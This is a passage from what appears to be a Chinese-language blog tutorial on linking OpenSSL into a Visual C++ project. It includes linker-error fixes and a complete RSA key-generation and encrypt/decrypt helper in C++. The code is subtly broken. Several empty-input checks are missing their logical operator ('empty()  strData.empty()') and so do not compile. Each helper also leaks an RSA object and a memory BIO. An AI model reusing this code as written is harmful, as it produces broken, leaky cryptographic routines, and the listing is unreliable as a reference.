class="string">&lt;openssl/err.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>3、将我们编译好的静态文件 <code>libcrypto.lib</code> 和 <code>libssl.lib</code> 添加至我们的项目中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;libssl.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;libcrypto.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>4、进行编译，若出现如下错误请添加 <code>ws2_32.lib</code> 依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_ioctlsocket，函数 BIO_socket_ioctl 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_getsockname，函数 BIO_sock_info 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_getsockopt，函数 BIO_sock_error 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2001: 无法解析的外部符号 __imp_getsockopt</span><br><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_ntohs，函数 BIO_get_port 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_addr.obj) : error LNK2001: 无法解析的外部符号 __imp_ntohs</span><br><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_gethostbyname，函数 BIO_gethostbyname 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_WSAStartup，函数 BIO_sock_init 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_WSACleanup，函数 bio_sock_cleanup_int 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_WSAGetLastError，函数 BIO_accept 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(bss_sock.obj) : error LNK2001: 无法解析的外部符号 __imp_WSAGetLastError</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2001: 无法解析的外部符号 __imp_WSAGetLastError</span><br><span class="line">1&gt;libcrypto.lib(b_addr.obj) : error LNK2019: 无法解析的外部符号 __imp_getaddrinfo，函数 BIO_lookup 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_addr.obj) : error LNK2019: 无法解析的外部符号 __imp_freeaddrinfo，函数 BIO_ADDRINFO_free 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_addr.obj) : error LNK2019: 无法解析的外部符号 __imp_getnameinfo，函数 addr_strings 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(bss_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_recv，函数 sock_read 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(bss_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_send，函数 sock_write 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(bss_sock.obj) : error LNK2019: 无法解析的外部符号 __imp_WSASetLastError，函数 sock_write 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2019: 无法解析的外部符号 __imp_accept，函数 BIO_accept_ex 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2019: 无法解析的外部符号 __imp_bind，函数 BIO_bind 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2019: 无法解析的外部符号 __imp_closesocket，函数 BIO_accept_ex 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2019: 无法解析的外部符号 __imp_connect，函数 BIO_connect 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2019: 无法解析的外部符号 __imp_listen，函数 BIO_listen 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2019: 无法解析的外部符号 __imp_setsockopt，函数 BIO_connect 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(b_sock2.obj) : error LNK2019: 无法解析的外部符号 __imp_socket，函数 BIO_socket 中引用了该符号</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>5、若出现如下错误请添加 <code>Crypt32.lib</code> 依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&gt;libcrypto.lib(e_capi.obj) : error LNK2019: 无法解析的外部符号 __imp_CertOpenStore，函数 capi_list_certs 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(e_capi.obj) : error LNK2019: 无法解析的外部符号 __imp_CertCloseStore，函数 capi_find_key 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(e_capi.obj) : error LNK2019: 无法解析的外部符号 __imp_CertEnumCertificatesInStore，函数 capi_find_cert 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(e_capi.obj) : error LNK2019: 无法解析的外部符号 __imp_CertFindCertificateInStore，函数 capi_find_cert 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(e_capi.obj) : error LNK2019: 无法解析的外部符号 __imp_CertDuplicateCertificateContext，函数 capi_load_ssl_client_cert 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(e_capi.obj) : error LNK2019: 无法解析的外部符号 __imp_CertFreeCertificateContext，函数 capi_dsa_free 中引用了该符号</span><br><span class="line">1&gt;libcrypto.lib(e_capi.obj) : error LNK2019: 无法解析的外部符号 __imp_CertGetCertificateContextProperty，函数 capi_cert_get_fname 中引用了该符号</span><br></pre></td></tr></table></figure><h1 id="最后为RSA的完整示例代码"><a href="#最后为RSA的完整示例代码" class="headerlink" title="最后为RSA的完整示例代码"></a>最后为RSA的完整示例代码</h1><h2 id="RSA头文件"><a href="#RSA头文件" class="headerlink" title="RSA头文件"></a>RSA头文件</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/rsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/engine.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/pem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Crypt32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;libssl.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;libcrypto.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 生成私钥公钥</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;nPrime&quot;&gt;素数, 默认值65537是官方推荐的一个数字&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;nKeySize&quot;&gt;密钥的位数, 默认值2048, 可以是别的值, 但最好是4的倍数, 且至少为1024&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strSavePath&quot;&gt;存储位置, 默认值当前路径&lt;/param&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateRSAPrivateAndPublicKey</span><span class="params">(<span class="type">int</span> nPrime = <span class="number">65537</span>, <span class="type">int</span> nKeySize = <span class="number">2048</span>, std::string strSavePath = <span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 私钥加密</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strPrivateKey&quot;&gt;私钥&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strData&quot;&gt;明文&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;密文&lt;/returns&gt;</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPrivateEncrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPrivateKey, <span class="type">const</span> std::string&amp; strData)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 私钥解密</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strPrivateKey&quot;&gt;私钥&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strData&quot;&gt;密文&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;明文&lt;/returns&gt;</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPrivateDecrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPrivateKey, <span class="type">const</span> std::string&amp; strData)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 公钥加密</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strPublicKey&quot;&gt;公钥&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strData&quot;&gt;明文&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;密文&lt;/returns&gt;</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPublicEncrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPublicKey, <span class="type">const</span> std::string&amp; strData)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 公钥解密</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strPublicKey&quot;&gt;公钥&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;strData&quot;&gt;密文&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;明文&lt;/returns&gt;</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPublicDecrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPublicKey, <span class="type">const</span> std::string&amp; strData)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RSA源文件"><a href="#RSA源文件" class="headerlink" title="RSA源文件"></a>RSA源文件</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;RSA.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的公钥和私钥</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateRSAPrivateAndPublicKey</span><span class="params">(<span class="type">int</span> nPrime, <span class="type">int</span> nKeySize, std::string strSavePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> RSA* rsa = <span class="built_in">RSA_new</span>();</span><br><span class="line"> BIGNUM* e = <span class="built_in">BN_new</span>();</span><br><span class="line"> <span class="built_in">BN_set_word</span>(e, nPrime);    <span class="comment">// 65537是官方推荐的一个数字, 其实任意素数都是可以的</span></span><br><span class="line"> <span class="built_in">RSA_generate_key_ex</span>(rsa, nKeySize, e, <span class="number">0</span>);    <span class="comment">// 2048表示密钥的位数, 可以是别的值, 但最好是4的倍数, 且至少为1024</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 使用BIO打开密钥文件</span></span><br><span class="line"> std::string privatePath = strSavePath + <span class="string">&quot;privateKey.pem&quot;</span>;</span><br><span class="line"> BIO* _pri = <span class="built_in">BIO_new_file</span>(privatePath.<span class="built_in">c_str</span>(), <span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="comment">// 写入密钥</span></span><br><span class="line"> <span class="built_in">PEM_write_bio_RSAPrivateKey</span>(_pri, rsa, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="comment">// 使用BIO打开公钥文件</span></span><br><span class="line"> std::string publicPath = strSavePath + <span class="string">&quot;publicKey.pem&quot;</span>;</span><br><span class="line"> BIO* _pub = <span class="built_in">BIO_new_file</span>(publicPath.<span class="built_in">c_str</span>(), <span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="comment">// 写入公钥</span></span><br><span class="line"> <span class="built_in">PEM_write_bio_RSAPublicKey</span>(_pub, rsa);</span><br><span class="line"></span><br><span class="line"> <span class="built_in">BIO_free</span>(_pub);</span><br><span class="line"> <span class="built_in">BIO_free</span>(_pri);</span><br><span class="line"> <span class="built_in">BN_free</span>(e);</span><br><span class="line"> <span class="built_in">RSA_free</span>(rsa);</span><br><span class="line"> <span class="built_in">CRYPTO_cleanup_all_ex_data</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 私钥加密</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPrivateEncrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPrivateKey, <span class="type">const</span> std::string&amp; strData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// 判断是否为空</span></span><br><span class="line"> <span class="keyword">if</span> (strPrivateKey.<span class="built_in">empty</span>()  strData.<span class="built_in">empty</span>())</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 读取私钥</span></span><br><span class="line"> RSA* pRSAPrivateKey = <span class="built_in">RSA_new</span>();</span><br><span class="line"> BIO* bio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line"> <span class="built_in">BIO_write</span>(bio, strPrivateKey.<span class="built_in">c_str</span>(), strPrivateKey.<span class="built_in">size</span>());</span><br><span class="line"> pRSAPrivateKey = <span class="built_in">PEM_read_bio_RSAPrivateKey</span>(bio, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (pRSAPrivateKey == <span class="literal">nullptr</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 获取密钥长度</span></span><br><span class="line"> <span class="type">int</span> nLen = <span class="built_in">RSA_size</span>(pRSAPrivateKey);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 返回结果</span></span><br><span class="line"> std::string strRet;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 加密</span></span><br><span class="line"> <span class="type">char</span>* pEncode = <span class="keyword">new</span> <span class="type">char</span>[nLen + <span class="number">1</span>];</span><br><span class="line"> <span class="type">int</span> ret = <span class="built_in">RSA_private_encrypt</span>(strData.<span class="built_in">length</span>(), (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)strData.<span class="built_in">c_str</span>(), (<span class="type">unsigned</span> <span class="type">char</span>*)pEncode, pRSAPrivateKey, RSA_PKCS1_PADDING);</span><br><span class="line"> <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     strRet = std::<span class="built_in">string</span>(pEncode, ret);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 释放资源</span></span><br><span class="line"> <span class="keyword">delete</span>[] pEncode;</span><br><span class="line"> <span class="built_in">RSA_free</span>(pRSAPrivateKey);</span><br><span class="line"> <span class="built_in">CRYPTO_cleanup_all_ex_data</span>();</span><br><span class="line"> <span class="keyword">return</span> strRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 私钥解密</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPrivateDecrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPrivateKey, <span class="type">const</span> std::string&amp; strData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// 判断是否为空</span></span><br><span class="line"> <span class="keyword">if</span> (strPrivateKey.<span class="built_in">empty</span>()  strData.<span class="built_in">empty</span>())</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 读取私钥</span></span><br><span class="line"> RSA* pRSAPrivateKey = <span class="built_in">RSA_new</span>();</span><br><span class="line"> BIO* bio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line"> <span class="built_in">BIO_write</span>(bio, strPrivateKey.<span class="built_in">c_str</span>(), strPrivateKey.<span class="built_in">size</span>());</span><br><span class="line"> pRSAPrivateKey = <span class="built_in">PEM_read_bio_RSAPrivateKey</span>(bio, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (pRSAPrivateKey == <span class="literal">nullptr</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 获取密钥长度</span></span><br><span class="line"> <span class="type">int</span> nLen = <span class="built_in">RSA_size</span>(pRSAPrivateKey);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 返回结果</span></span><br><span class="line"> std::string strRet;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 解密</span></span><br><span class="line"> <span class="type">char</span>* pEncode = <span class="keyword">new</span> <span class="type">char</span>[nLen + <span class="number">1</span>];</span><br><span class="line"> <span class="type">int</span> ret = <span class="built_in">RSA_private_decrypt</span>(strData.<span class="built_in">length</span>(), (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)strData.<span class="built_in">c_str</span>(), (<span class="type">unsigned</span> <span class="type">char</span>*)pEncode, pRSAPrivateKey, RSA_PKCS1_PADDING);</span><br><span class="line"> <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     strRet = std::<span class="built_in">string</span>(pEncode, ret);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 释放资源</span></span><br><span class="line"> <span class="keyword">delete</span>[] pEncode;</span><br><span class="line"> <span class="built_in">RSA_free</span>(pRSAPrivateKey);</span><br><span class="line"> <span class="built_in">CRYPTO_cleanup_all_ex_data</span>();</span><br><span class="line"> <span class="keyword">return</span> strRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公钥加密</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPublicEncrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPublicKey, <span class="type">const</span> std::string&amp; strData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// 判断是否为空</span></span><br><span class="line"> <span class="keyword">if</span> (strPublicKey.<span class="built_in">empty</span>()  strData.<span class="built_in">empty</span>())</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 读取公钥</span></span><br><span class="line"> RSA* pRSAPublicKey = <span class="built_in">RSA_new</span>();</span><br><span class="line"> BIO* bio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line"> <span class="built_in">BIO_write</span>(bio, strPublicKey.<span class="built_in">c_str</span>(), strPublicKey.<span class="built_in">size</span>());</span><br><span class="line"> pRSAPublicKey = <span class="built_in">PEM_read_bio_RSAPublicKey</span>(bio, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (pRSAPublicKey == <span class="literal">nullptr</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 获取密钥长度</span></span><br><span class="line"> <span class="type">int</span> nLen = <span class="built_in">RSA_size</span>(pRSAPublicKey);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 返回结果</span></span><br><span class="line"> std::string strRet;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 加密</span></span><br><span class="line"> <span class="type">char</span>* pEncode = <span class="keyword">new</span> <span class="type">char</span>[nLen + <span class="number">1</span>];</span><br><span class="line"> <span class="type">int</span> ret = <span class="built_in">RSA_public_encrypt</span>(strData.<span class="built_in">length</span>(), (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)strData.<span class="built_in">c_str</span>(), (<span class="type">unsigned</span> <span class="type">char</span>*)pEncode, pRSAPublicKey, RSA_PKCS1_PADDING);</span><br><span class="line"> <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     strRet = std::<span class="built_in">string</span>(pEncode, ret);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 释放资源</span></span><br><span class="line"> <span class="keyword">delete</span>[] pEncode;</span><br><span class="line"> <span class="built_in">RSA_free</span>(pRSAPublicKey);</span><br><span class="line"> <span class="built_in">CRYPTO_cleanup_all_ex_data</span>();</span><br><span class="line"> <span class="keyword">return</span> strRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公钥解密</span></span><br><span class="line"><span class="function">std::string <span class="title">RSAPublicDecrypt</span><span class="params">(<span class="type">const</span> std::string&amp; strPublicKey, <span class="type">const</span> std::string&amp; strData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// 判断是否为空</span></span><br><span class="line"> <span 